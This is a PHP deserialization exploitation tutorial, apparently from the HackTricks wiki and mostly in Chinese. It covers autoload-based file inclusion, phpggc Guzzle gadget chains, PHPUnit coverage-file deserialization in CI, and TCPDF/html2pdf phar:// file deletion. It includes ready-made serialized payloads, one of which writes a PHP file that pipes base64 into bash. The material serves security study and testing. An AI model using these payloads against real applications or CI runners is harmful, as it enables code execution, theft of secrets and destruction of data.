# PHP - Deserialization + Autoload Classes

{{#include ../../banners/hacktricks-training.md}}

First, you should check what are [**Autoloading Classes**](https://www.php.net/manual/en/language.oop5.autoload.php).

## PHP deserialization + spl_autoload_register + LFI/Gadget

我们遇到一种情况：在一个 webapp 里发现了 **PHP deserialization**，但当前应用中没有任何在 **`phpggc`** 里可利用的 gadget 库。 然而，在同一容器里存在另一个使用 composer 的 webapp，里面有 **vulnerable libraries**。因此目标是 **加载另一个 webapp 的 composer loader** 并滥用它来 **加载一个 gadget，利用易受反序列化影响的 webapp 中的库**。

Steps:

- 你发现了一个 **deserialization**，并且当前应用代码中 **没有任何 gadget**
- 你可以滥用类似下面的 **`spl_autoload_register`** 函数来 **加载任何带有 `.php` 扩展名 的本地文件**
- 为此你使用一个反序列化，其中类名会在 **`$name`** 里。 在序列化对象的类名中 **不能使用 "/" 或 "."**，但该 **代码** 会将 **下划线** ("_") **替换为斜杠** ("/")。因此诸如 `tmp_passwd` 的类名会被转换成 `/tmp/passwd.php`，代码将尝试加载它。\
A **gadget example** will be: **`O:10:"tmp_passwd":0:{}`**

<details>
<summary>spl_autoload_register LFI/autoload example</summary>
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
</details>

> [!TIP]
> 如果你有一个 **file upload** 并且可以上传扩展名为 **`.php`** 的文件，你可以**直接滥用此功能**并获得 RCE。

在我的情况下，我没有这样的功能，但在**same container** 中有另一个使用 composer 的 web 页面，里面有一个**易受 `phpggc` gadget 利用的 library**。

- 要加载这个其他 library，首先你需要 **加载另一个 web 应用的 composer loader**（因为当前应用的 loader 无法访问另一个应用的 libraries）。**知道应用的路径**后，你可以非常容易地做到这一点：**`O:28:"www_frontend_vendor_autoload":0:{}`**（在我的例子中，composer loader 位于 `/www/frontend/vendor/autoload.php`）
- 现在，你可以**加载**另一个应用的**app composer loader**，接下来就该**`generate the phpgcc`**要使用的**payload**了。在我的案例中，我使用了 **`Guzzle/FW1`**，它允许我**在文件系统中写入任意文件**。
- NOTE: 生成的 gadget 无法工作，为了让它工作，我修改了 phpggc 的那个 payload **`chain.php`**，并将类的**所有 attribute**从 **private** 改为 **public**。否则，在反序列化字符串后，创建对象的属性不会有任何值。
- 现在我们已经有办法**加载另一个应用的 composer loader**并拥有一个可用的 **phpggc payload**，但我们需要**在同一请求（SAME REQUEST）中完成这一步，以便在 gadget 被使用时 loader 已被加载**。为此，我发送了一个包含两个对象的序列化数组，格式如下：
- 你可以看到**先加载 loader，然后是 payload**
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
- 现在，我们可以 **创建并写入文件**，但是用户 **无法在 web server 的任何文件夹中写入**。因此，如 payload 中所示，PHP 调用 **`system`** 并带有一些 **base64**，生成了 **`/tmp/a.php`**。然后，我们可以 **重用第一种 payload**（之前用于作为 LFI 来加载另一个 webapp 的 composer loader）**加载生成的 `/tmp/a.php`** 文件。只需将其添加到 deserialization gadget：
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{} }
```
**Summary of the payload**

- **Load the composer autoload**：在同一容器中加载另一个 webapp 的 composer autoload
- **Load a phpggc gadget**：利用另一个 webapp 的库（最初易受反序列化影响的 webapp 的库中没有任何 gadget）
- 该 gadget 会在 /tmp/a.php 中 **create a file with a PHP payload**，包含恶意命令（webapp 用户无法写入任何 webapp 的文件夹）
- 我们 payload 的最后部分将使用 **load the generated php file** 来执行命令

我需要 **调用此反序列化两次**。在我的测试中，第一次创建了 `/tmp/a.php` 文件但未被加载，第二次则被正确加载。

### Recent phpggc goodies (2025)

- **phpggc master branch 不断增加 chains**：OpenCart/RCE2、Drupal/FD1/SQLI1/XXE1、WordPress/YoastSEO/FW1 等在 2025 年加入——当目标应用与这些项目共享 vendor 代码时很有用。快速搜索的方法是 `phpggc -l | grep -E "OpenCart|Drupal|Yoast"`（先更新你的 clone）。
- 当通过 autoloading 在应用间混合 gadgets 时，记住 **private properties in gadget definitions may be dropped**，如果类在目标中被以不同方式重新声明；如果 payload 到达时属性是空的，可以编辑 gadget 的 `chain.php` 将属性改为 `public`（同样的技巧如上所示）。

## PHPUnit PHPT coverage deserialization (CI/CD entrypoint)

`phpunit` 在 **8.5.52 / 9.6.34 / 10.5.63 / 11.5.50 / 12.5.8** 之前（CVE-2026-24765）会从 **PHPT runner** 生成的 `.coverage` 文件反序列化任意 PHP 对象。在允许不受信任的贡献者提交测试的 CI 管道中，放置一个精心构造的 `.coverage` 文件会在测试套件运行时触发反序列化——无需 web 访问。

**Attack flow**

1. 在仓库（或 artifact）中放置一个恶意的 `.coverage` 文件，包含存在于测试依赖中的一个序列化 gadget（例如来自 phpggc 的 Monolog 或 Guzzle chain）。
2. 提交一个 PR；当 CI 执行 `phpunit --configuration phpunit.xml` 时，PHPT runner 读取 coverage 文件并反序列化该 gadget，从而在 runner 容器内获得 **RCE inside the runner container**。
3. 当测试挂载 CI secrets（cloud creds、deployment keys）时，这尤其危险。

**Minimal malicious coverage stub** (drop alongside a PHPT test):
```php
<?php
$payload = file_get_contents('php://stdin'); // serialized gadget from phpggc
file_put_contents('exploit.coverage', $payload);
```
Run the PHPT so phpunit consumes `exploit.coverage`.

## TCPDF `__destruct` POP chain 用于任意文件删除

当真实的 `TCPDF` 实例被垃圾回收时，它会调用 `_destroy(true)`，遍历 `$this->imagekeys`，并对任何看起来像位于 `K_PATH_CACHE` 下的缓存文件执行 `unlink()`。如果应用在 `TCPDF` 类已被加载的情况下执行 `unserialize($user_data)`（例如它期望一个带有 `html` 键的数组），你可以提供一个序列化对象来设置：

- 将 `file_id` 设置为任意不在 `self::$cleaned_ids` 中的整数（例如 `-1`）。
- 将 `imagekeys` 设置为以 `K_PATH_CACHE` 开头的路径，或可以被伪造成这样的路径（例如当 `K_PATH_CACHE` 为 `/tmp/` 时使用 `/tmp/../tmp/do_not_delete_this_file.txt`）。

Example payload hitting an unsafe `unserialize($_GET['p']); $pdf->writeHTML($payload['html']);` flow:
```text
a:1:{s:4:"html";O:5:"TCPDF":2:{s:7:"file_id";i:-1;s:9:"imagekeys";a:1:{i:0;s:39:"/tmp/../tmp/do_not_delete_this_file.txt";}}}
```
### 通过 html2pdf `<cert>` 标签中的 `phar://` 触发 gadget

`spipu/html2pdf` (≤5.3.0) 包装 TCPDF 并暴露了一个自定义的 `<cert>` 块，其 `src`/`privkey` 属性仅用 `file_exists()` 进行验证。在 PHP < 8.0 上，任何触及 `phar://` URL 的文件系统函数都会导致 Phar 元数据被 `unserialize()`。通过将上面恶意的 TCPDF 对象存放在 Phar 存档的元数据中，即使应用本身从未调用 `unserialize()`，也能获得稳定的 POP。

1. 制作一个 Phar（需 `phar.readonly=0`），将 stub/manifest 设置成看起来像图像（例如把 `archive.phar` 重命名为 `archive.png`），并将序列化后的 TCPDF 对象存入 Phar 的元数据中。
2. 将文件上传/放置到可访问的位置，例如 `/tmp/user_files/user_1/archive.png`。
3. 提交包含 CERT 标签的 HTML，使 html2pdf 解析攻击者控制的路径：
```html
<cert src="phar:///tmp/user_files/user_1/archive.png"
privkey="phar:///tmp/user_files/user_1/archive.png" />
```
调用 `file_exists()` 会反序列化元数据、实例化 TCPDF，其析构函数会删除被选定的文件，将 html2pdf 转变为一个强大的 `phar://` 入口点。版本 5.3.1 添加了 `Security::checkValidPath()` 来阻止未批准的协议，因此旧版部署仍然具有吸引力。

## 参考资料

- [Positive Technologies – Blind Trust: What Is Hidden Behind the Process of Creating Your PDF File?](https://swarm.ptsecurity.com/blind-trust-what-is-hidden-behind-the-process-of-creating-your-pdf-file/)
- [GitLab Advisory – CVE-2024-51058 TCPDF Hash Comparison / Phar Deserialization](https://advisories.gitlab.com/pkg/composer/tecnickcom/tcpdf/)
- [CVE-2026-24765 – PHPUnit PHPT Coverage Unsafe Deserialization](https://cvereports.com/reports/CVE-2026-24765)

{{#include ../../banners/hacktricks-training.md}}
